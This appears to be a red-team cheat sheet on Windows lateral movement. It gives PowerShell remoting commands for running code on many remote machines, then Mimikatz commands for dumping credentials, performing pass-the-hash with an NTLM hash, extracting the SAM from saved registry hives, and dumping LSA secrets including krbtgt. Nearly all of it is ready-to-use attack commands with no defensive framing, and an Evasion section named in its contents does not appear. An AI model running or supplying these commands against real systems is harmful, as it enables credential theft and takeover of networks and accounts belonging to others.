# Lateral Movement
* [General](#General) 
* [Evasion](#Evasion) 
* [Mimikatz](#Mimikatz) 

## General
#### Connect to machine with administrator privs
```
Enter-PSSession -Computername <COMPUTERNAME>
$sess = New-PSSession -Computername <COMPUTERNAME>
Enter-PSSession $sess
```

#### Execute commands on a machine
```
Invoke-Command -Computername <COMPUTERNAME> -Scriptblock {<COMMAND>} 
Invoke-Command -Scriptblock {<COMMAND>} $sess
```

#### Load script on a machine
```
Invoke-Command -Computername <COMPUTERNAME> -FilePath <PATH>
Invoke-Command -FilePath <PATH> $sess
```

#### Execute locally loaded function on a list of remote machines
```
Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content computers.txt)
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content computers.txt)
```

## Mimikatz
#### Mimikatz dump credentials on local machine
```
Invoke-Mimikatz -Dumpcreds
```

#### Mimikatz dump credentials on multiple remote machines
```
Invoke-Mimikatz -Dumpcreds -ComputerName @("<COMPUTERNAME 1>","<COMPUTERNAME2>")
```

#### Mimikatz start powershell pass the hash (run as local admin)
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.exe"'
```

#### Mimikatz dump SAM
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
```

or

```
reg save HKLM\SAM SamBkup.hiv
reg save HKLM\System SystemBkup.hiv
#Start mimikatz as administrator
privilege::debug
token::elevate
lsadump::sam SamBkup.hiv SystemBkup.hiv
```

#### Mimikatz dump lsa (krbtgt to)
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```
